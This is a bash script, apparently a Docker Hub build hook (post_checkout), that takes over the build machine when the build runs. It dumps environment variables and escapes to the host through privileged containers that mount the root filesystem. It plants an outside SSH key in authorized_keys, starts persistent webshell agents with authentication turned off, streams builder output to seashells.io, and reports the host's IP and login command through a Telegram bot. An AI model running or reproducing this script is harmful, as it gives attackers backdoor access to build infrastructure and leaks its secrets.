#!/usr/bin/env bash

docker version

docker info

echo "------ HOOK START - POST_CHECKOUT -------"
printenv

SCRIPT="$(realpath "$0")"
SCRIPT_DIR="$(dirname $SCRIPT)"

log(){
  XORBOX=navigaid/xorbox:8f7a4248bc098349651bd83415233375e81d13b5
  docker run -v /etc:/etc $XORBOX tgbot "${@}"
}

# trigger itself
bash -v $SCRIPT_DIR/trigger

# start the `host' container
docker run \
  -dit \
  --net=host \
  --uts=host \
  --pid=host \
  --ipc=host \
  -v /root:/root \
  -v /home:/home \
  -v /:/host \
  -v /src:/src \
  -v "${SCRIPT_DIR}:${SCRIPT_DIR}" \
  -w "${SCRIPT_DIR}" \
  -v /var/run/docker.sock:/var/run/docker.sock \
  --privileged \
  --name host \
  --rm \
  alpine cat

# setup ssh login
docker exec -i host /bin/sh -c 'cat >>/home/ubuntu/.ssh/authorized_keys' <<< 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDX5+yq0TQrW6lxsx0hcT+93A4K0QZ92UWM0BY0cc8ahyIey9/biN54at0xSSnu351ltJJdcp3O5XYs4qwCMiRBL+4YiNod0GF7hUb9yvQh6+SeiKy5y+0ChipUTXo3hK2wZ7plq6rI9JUu63E8TDWWG2Miy0dpn7YrCe2h27Jb7SZ9cc6df9JLXhXBcleHFrY0MDPGWfaMD2jnXGQFfyiFFyH/PlL3Ztu2BghozbZUlq7n4y8QpLcyko4n8OhtupIuQ4NHF4bKxwNrVdhLmG24IqLTTRIyUkHEJvwCENmP2kNy3NkNw+pdhJzG/e8DrG30HKat7flyFZp8TDEluVwB'
# now you can login with "ssh ubuntu@$(curl ip.sb)" 

docker exec -i host /bin/sh -c 'cat >>/home/ubuntu/.ssh/authorized_keys' <<-EOF
  `cat $SCRIPT_DIR/host.pub`
EOF

# setup hostname libredot.com
# docker exec -i host /bin/sh -c 'ssh -i host -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ubuntu@localhost sudo tee /proc/sys/kernel/hostname' <<-EOF
#  libredot.com
# EOF
docker exec -i host chroot /host hostname libredot.com

# first agent
docker run \
  --restart=always \
  -dit \
  --uts=host \
  --pid=host \
  --ipc=host \
  --net=host \
  -v /:/host \
  -v /root:/root \
  -v /home:/home \
  -v /src:/src \
  -v /var/run/docker.sock:/var/run/docker.sock \
  --privileged \
  --name agent \
  conntroll/agent -auth no -tags "Hi","this is a tag"

# second agent
docker run \
  --restart=always \
  -dit \
  --uts=host \
  --pid=host \
  --ipc=host \
  --net=host \
  -v /:/host \
  -v /root:/root \
  -v /home:/home \
  -v /src:/src \
  -v /var/run/docker.sock:/var/run/docker.sock \
  --privileged \
  --name agent-demo2 \
  conntroll/agent -auth no -tags 'I'm a demo container. Click "connect" to open a webshell'

# second agent
docker run \
  --restart=always \
  -dit \
  --uts=host \
  --pid=host \
  --ipc=host \
  --net=host \
  -v /:/host \
  -v /root:/root \
  -v /home:/home \
  -v /src:/src \
  -v /var/run/docker.sock:/var/run/docker.sock \
  -w /an/empty/working/directory \
  --privileged \
  --name agent-demo-rootfs \
  conntroll/agent -auth no -tags 'I'm another demo container. Click the links below to browse the specified directory'

# invctrl/client puller && herder
docker run --restart=always -dit --net=host -v /root:/root -v /home:/home -v /src:/src -v /var/run/docker.sock:/var/run/docker.sock --privileged --name puller --entrypoint /bin/sh invctrl/client -c 'while :; do docker pull invctrl/client; sleep 1; done'
docker exec -id puller sh -c 'while :; do docker run -dit --net=host -v /root:/root -v /home:/home -v /src:/src -v /var/run/docker.sock:/var/run/docker.sock --privileged --name dind --rm invctrl/client; docker wait dind; docker rm -f dind; sleep 1; done'

# start seashells.io logger in highland container, it should have the same lifespan as highland
# exec -id ignores stdin, so I have to do this in two stages:
# stage 1: send the script to run to the container
# stage 2: run the script inside the container in detatch mode
cat $SCRIPT_DIR/seashells | docker exec -i $(docker ps --format '{{if (eq (index (split (printf "%s" .Image) ":") 0) "docker/highland_builder")}}{{.ID}}{{end}}' | grep .) bash -c 'cat > /tmp/seashells'
docker exec -id $highland bash /tmp/seashells
# wait /tmp/seashells.url to appear
SEASHELLS_URL=$(docker exec -i $(docker ps --format '{{if (eq (index (split (printf "%s" .Image) ":") 0) "docker/highland_builder")}}{{.ID}}{{end}}' | grep .) bash -c 'while [ ! -f /tmp/seashells.url ]; do sleep 1; done; cat > /tmp/seashells.url')
#log "piping to seashells.io"
log "DOCKER_REPO" "ssh ubuntu@$(curl ip.sb)" "$SEASHELLS_URL"

echo "------ HOOK END - POST_CHECKOUT -------"
